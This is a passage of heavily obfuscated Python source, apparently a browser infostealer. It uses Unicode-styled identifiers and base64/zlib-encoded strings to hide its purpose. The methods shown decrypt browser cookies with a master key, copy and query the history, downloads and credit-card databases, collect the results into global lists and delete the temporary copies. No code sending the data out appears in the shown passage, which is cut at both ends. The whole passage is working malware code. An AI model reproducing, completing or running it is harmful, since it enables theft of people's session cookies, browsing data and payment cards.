signed=False)] or not 𝗿𝘰𝘸[𝘪𝘯𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 404 - (𝙞𝘯𝙩(𝙊) + 𝙞), 𝙢𝙖𝙥(__𝙞𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝗶𝘵𝙚𝙧(__𝗶𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3sq\xac\x02\x00\x03\x04\x01N')).decode())] * 3)), 𝗿𝗮𝘯𝙜𝙚(1)), __𝗶𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝙤𝙬[𝘪𝙣𝙩.from_bytes(𝗺𝙖𝙥(lambda O, i: 360 - (𝙞𝗻𝘁(𝗢) + 𝗶), 𝙢𝗮𝗽(__𝙞𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝗲𝗿(__𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xad\n5\x01\x00\x03\x84\x01Q')).decode())] * 3)), 𝗿𝙖𝗻𝘨𝘦(1)), __𝙞𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝙤𝘄[𝘪𝙣𝘁.from_bytes(𝗺𝙖𝙥(lambda O, i: 821 - (𝘪𝗻𝘵(𝘖) + 𝘪), 𝙢𝗮𝗽(__𝙞𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝘵𝗲𝗿(__𝘪𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3wq5\x01\x00\x02\xca\x01\r')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝙚(1)), __𝗶𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝗼𝗼𝙠𝗶𝘦 = 𝙨𝙚𝙡𝗳.decrypt_password(𝙧𝘰𝘸[𝙞𝙣𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 753 - (𝗶𝙣𝙩(𝙊) + 𝘪), 𝗺𝙖𝗽(__𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝙞𝘁𝙚𝘳(__𝗶𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xab\n-\x07\x00\x03\xcb\x01\x95')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝙚(1)), __𝘪𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝙚𝙡𝙛.master_key)
            __𝘊𝗢𝘖𝘒𝘐𝘌𝗦__.append(𝙏𝙮𝗽𝘦𝘀.Cookie(𝙧𝘰𝘸[𝘪𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 812 - (𝘪𝗻𝘁(𝙊) + 𝗶), 𝗺𝘢𝘱(__𝙞𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝘁𝙚𝗿(__𝙞𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝙚(0)), __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝘰𝙬[𝙞𝗻𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 888 - (𝗶𝙣𝘁(𝙊) + 𝙞), 𝗺𝗮𝗽(__𝗶𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝘪𝙩𝘦𝘳(__𝙞𝗺𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3wI7\x06\x00\x03\r\x01.')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝘦(1)), __𝘪𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝘰𝙬[𝗶𝘯𝘁.from_bytes(𝙢𝘢𝗽(lambda O, i: 512 - (𝗶𝗻𝘁(𝘖) + 𝗶), 𝙢𝙖𝙥(__𝗶𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝘁𝘦𝗿(__𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0bq-\x07\x00\x039\x01_')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝘦(1)), __𝗶𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝗼𝘰𝘬𝙞𝘦, 𝙧𝘰𝙬[𝘪𝙣𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 809 - (𝙞𝘯𝘁(𝗢) + 𝗶), 𝗺𝗮𝘱(__𝙞𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝘪𝙩𝗲𝘳(__𝗶𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3wq4\x04\x00\x02\xbf\x01\x06')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝗲(1)), __𝗶𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙤𝙣𝗻.close()
        𝙤𝙨.remove(__𝗶𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())

    def get_web_history(self, path, profile):
        𝘄𝙚𝙗_𝗵𝗶𝘴𝘁𝗼𝘳𝘆_𝘥𝘣 = __𝙞𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝙥𝘢𝙩𝘩, 𝗽𝙧𝙤𝙛𝗶𝗹𝗲)
        if not 𝘰𝙨.path.exists(𝙬𝘦𝗯_𝙝𝗶𝘀𝙩𝗼𝗿𝙮_𝙙𝗯):
            return
        𝘴𝙝𝙪𝙩𝘪𝘭.copy(𝘸𝗲𝘣_𝘩𝘪𝙨𝘵𝙤𝙧𝘺_𝘥𝗯, __𝗶𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝗰𝗼𝘯𝘯 = 𝙨𝗾𝙡𝗶𝙩𝗲3.connect(__𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())
        𝙘𝘂𝙧𝘴𝙤𝘳 = 𝙘𝗼𝗻𝙣.cursor()
        𝙘𝘶𝘳𝙨𝙤𝗿.execute(__𝘪𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝙧𝘰𝘸 in 𝙘𝘶𝘳𝘴𝘰𝙧.fetchall():
            if not 𝙧𝗼𝘄[𝗶𝘯𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 461 - (𝘪𝙣𝘵(𝗢) + 𝙞), 𝗺𝘢𝙥(__𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝘵𝗲𝘳(__𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝗻𝗴𝗲(0)), __𝗶𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝙬[𝙞𝗻𝙩.from_bytes(𝗺𝗮𝘱(lambda O, i: 256 - (𝙞𝙣𝙩(𝗢) + 𝙞), 𝘮𝗮𝘱(__𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝙞𝘵𝗲𝘳(__𝘪𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcd\n5\x04\x00\x03Q\x01>')).decode())] * 3)), 𝙧𝘢𝗻𝗴𝗲(1)), __𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝘄[𝗶𝘯𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 777 - (𝘪𝘯𝙩(𝗢) + 𝘪), 𝗺𝗮𝘱(__𝘪𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝙞𝘵𝘦𝙧(__𝗶𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xabJ6\x04\x00\x03\xa1\x01]')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝗲(1)), __𝗶𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝗪𝙀𝗕_𝗛𝙄𝘚𝗧𝙊𝗥𝙔__.append(𝗧𝘆𝘱𝙚𝙨.WebHistory(𝙧𝘰𝘄[𝙞𝙣𝘁.from_bytes(𝙢𝙖𝗽(lambda O, i: 617 - (𝗶𝗻𝘵(𝘖) + 𝙞), 𝙢𝗮𝘱(__𝗶𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝘁𝘦𝘳(__𝗶𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝙣𝗴𝘦(0)), __𝘪𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘸[𝙞𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 561 - (𝘪𝘯𝙩(𝙊) + 𝘪), 𝘮𝗮𝘱(__𝗶𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝘪𝘵𝙚𝗿(__𝘪𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\x0b\x89,\x07\x00\x03a\x01s')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝗲(1)), __𝘪𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝙬[𝗶𝘯𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 721 - (𝘪𝘯𝘁(𝙊) + 𝙞), 𝗺𝘢𝗽(__𝘪𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝙩𝙚𝗿(__𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xabr5\x05\x00\x03i\x01C')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝘦(1)), __𝙞𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝙤𝙣𝗻.close()
        𝙤𝘀.remove(__𝗶𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcbI\x8br\xf7\xb4\x05\x00HH\x06\xe0')).decode())

    def get_downloads(self, path, profile):
        𝗱𝗼𝘄𝙣𝘭𝗼𝙖𝘥𝘀_𝘥𝗯 = __𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK56LN\x05\xe2`\xf7\x9c\xaa\x14w\xcb\xca\xd4@[[\x00B=\x06f')).decode().format(𝙥𝙖𝙩𝗵, 𝙥𝘳𝘰𝘧𝘪𝙡𝙚)
        if not 𝗼𝙨.path.exists(𝙙𝘰𝙬𝙣𝘭𝗼𝙖𝙙𝘀_𝘥𝙗):
            return
        𝘀𝙝𝙪𝘵𝙞𝘭.copy(𝘥𝗼𝘸𝗻𝗹𝘰𝗮𝘥𝙨_𝙙𝙗, __𝙞𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝘤𝗼𝙣𝙣 = 𝘴𝗾𝘭𝘪𝘵𝙚3.connect(__𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝙘𝘶𝘳𝘴𝘰𝗿 = 𝘤𝗼𝘯𝘯.cursor()
        𝙘𝘂𝙧𝘴𝘰𝘳.execute(__𝙞𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝙧𝙤𝘄 in 𝘤𝘂𝗿𝙨𝘰𝙧.fetchall():
            if not 𝗿𝙤𝘄[𝙞𝗻𝘁.from_bytes(𝗺𝙖𝗽(lambda O, i: 869 - (𝗶𝙣𝘵(𝘖) + 𝗶), 𝙢𝙖𝘱(__𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝙩𝗲𝘳(__𝙞𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝘦(0)), __𝙞𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝘰𝘄[𝙞𝗻𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 456 - (𝙞𝙣𝘁(𝙊) + 𝗶), 𝘮𝘢𝙥(__𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝘵𝘦𝘳(__𝗶𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3s\t5\x04\x00\x02\xe3\x01\x19')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝗲(1)), __𝘪𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝗗𝗢𝙒𝙉𝘓𝘖𝘈𝘋𝘚__.append(𝗧𝘆𝙥𝗲𝙨.Download(𝘳𝗼𝙬[𝘪𝘯𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 718 - (𝘪𝘯𝘁(𝙊) + 𝗶), 𝘮𝘢𝗽(__𝘪𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘁𝗲𝙧(__𝙞𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝗲(0)), __𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘄[𝙞𝘯𝘁.from_bytes(𝗺𝙖𝘱(lambda O, i: 628 - (𝙞𝙣𝘵(𝘖) + 𝙞), 𝙢𝗮𝘱(__𝙞𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝙩𝘦𝘳(__𝙞𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcb\xf24\x06\x00\x03?\x015')).decode())] * 3)), 𝗿𝘢𝙣𝘨𝙚(1)), __𝙞𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝘤𝘰𝗻𝗻.close()
        𝙤𝘀.remove(__𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path, profile):
        𝗰𝘢𝙧𝘥𝘴_𝘥𝙗 = __𝗶𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK56LN\x05\xe20\xa3\xb0LO\xd7\xa0\x8c\x14wW[\x00?N\x06\x15')).decode().format(𝘱𝙖𝙩𝗵, 𝗽𝙧𝙤𝙛𝗶𝗹𝙚)
        if not 𝗼𝘀.path.exists(𝙘𝙖𝙧𝗱𝘴_𝘥𝙗):
            return
        𝘴𝙝𝘂𝙩𝗶𝘭.copy(𝗰𝗮𝘳𝗱𝘀_𝘥𝗯, __𝙞𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝘰𝙣𝙣 = 𝘴𝘲𝗹𝗶𝘵𝙚3.connect(__𝘪𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝙪𝙧𝙨𝘰𝙧 = 𝘤𝙤𝗻𝘯.cursor()
        𝗰𝘶𝗿𝙨𝘰𝗿.execute(__𝘪𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝙧𝙤𝙬 in 𝘤𝙪𝗿𝘀𝙤𝗿.fetchall():
            if not 𝙧𝙤𝘄[𝘪𝗻𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 865 - (𝙞𝙣𝙩(𝘖) + 𝙞), 𝗺𝙖𝙥(__𝘪𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝘵𝙚𝘳(__𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝙜𝙚(0)), __𝘪𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝘰𝘸[𝗶𝙣𝘵.from_bytes(𝙢𝘢𝗽(lambda O, i: 572 - (𝙞𝙣𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝗶𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘵𝗲𝗿(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0bI\xae\x00\x00\x03v\x01~')).decode())] * 3)), 𝙧𝙖𝙣𝙜𝗲(1)), __𝘪𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝘰𝙬[𝘪𝗻𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 589 - (𝗶𝘯𝙩(𝗢) + 𝘪), 𝘮𝗮𝘱(__𝘪𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘵𝙚𝙧(__𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0bI7\x06\x00\x039\x01=')).decode())] * 3)), 𝗿𝘢𝘯𝘨𝘦(1)), __𝙞𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝘰𝘸[𝙞𝗻𝘁.from_bytes(𝗺𝗮𝙥(lambda O, i: 361 - (𝘪𝙣𝘵(𝘖) + 𝗶), 𝘮𝘢𝗽(__𝗶𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝙩𝙚𝗿(__𝗶𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xad\n5\x01\x00\x03\x84\x01Q')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝙚(1)), 